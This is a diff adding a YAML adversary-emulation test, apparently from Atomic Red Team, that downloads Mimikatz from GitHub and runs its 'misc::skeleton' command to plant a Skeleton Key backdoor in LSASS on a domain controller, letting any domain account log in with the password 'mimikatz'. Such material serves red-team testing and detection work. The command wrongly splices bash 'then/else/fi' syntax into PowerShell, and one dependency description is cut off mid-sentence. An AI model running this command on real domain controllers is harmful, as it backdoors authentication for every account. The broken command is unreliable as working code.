@@ -1,0 +1,76 @@
+- id: 0ee8081f-e9a7-4a2e-a23f-68473023184f
+  name: Skeleton Key via Mimikatz
+  description: 'Injects a Skeleton Key into LSASS on a domain controller using Mimikatz.
+    Once injected, any domain
+
+    user account can be authenticated using the password ''mimikatz'' until the domain
+    controller is rebooted.
+
+
+    This test must be run on an isolated domain controller and must not be performed
+    on a production DC.
+
+    Cleanup forces a reboot of the domain controller to evict the skeleton key from
+    LSASS memory.'
+  tactic: credential-access
+  technique:
+    attack_id: T1556.001
+    name: 'Modify Authentication Process: Domain Controller Authentication'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "C:\ExternalPayloads\Mimikatz\x64\mimikatz.exe") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory "C:\ExternalPayloads\Mimikatz"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
+          -OutFile "C:\ExternalPayloads\Mimikatz\mimikatz.zip"; Expand-Archive -LiteralPath
+          "C:\ExternalPayloads\Mimikatz\mimikatz.zip" -DestinationPath "C:\ExternalPayloads\Mimikatz"
+          -Force; fi; & "C:\ExternalPayloads\Mimikatz\x64\mimikatz.exe" "privilege::debug"
+          "misc::skeleton" "exit"'
+        cleanup: Remove-Item -Path "#{directory_path}" -Recurse -ErrorAction Ignore;
+          Restart-Computer -Force
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1556.001
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      mimikatz_path:
+        type: path
+        default: C:\ExternalPayloads\Mimikatz\x64\mimikatz.exe
+        description: Path to the mimikatz executable
+      file_path:
+        type: path
+        default: C:\ExternalPayloads\Mimikatz\mimikatz.zip
+        description: File path where the zipped mimikatz file is downloaded to
+      mimikatz_url:
+        type: url
+        default: https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+        description: The URL for the mimikatz release zip
+      directory_path:
+        type: path
+        default: C:\ExternalPayloads\Mimikatz
+        description: Directory path for mimikatz
+    dependencies:
+    - description: Mimikatz must be present on the host machine at
+      prereq_command: 'if (Test-Path "#{mimikatz_path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "#{directory_path}" -ErrorAction
+        Ignore -Force | Out-Null
+
+        Invoke-WebRequest -Uri "#{mimikatz_url}" -OutFile "#{file_path}"
+
+        Expand-Archive -LiteralPath "#{file_path}" -DestinationPath "#{directory_path}"
+        -Force
+
+        '
+    technique_created: '2020-02-11T19:05:02.399Z'
+    atomic_guid: 0ee8081f-e9a7-4a2e-a23f-68473023184f
+    import_timestamp: '2026-04-16T04:52:33.647556Z'
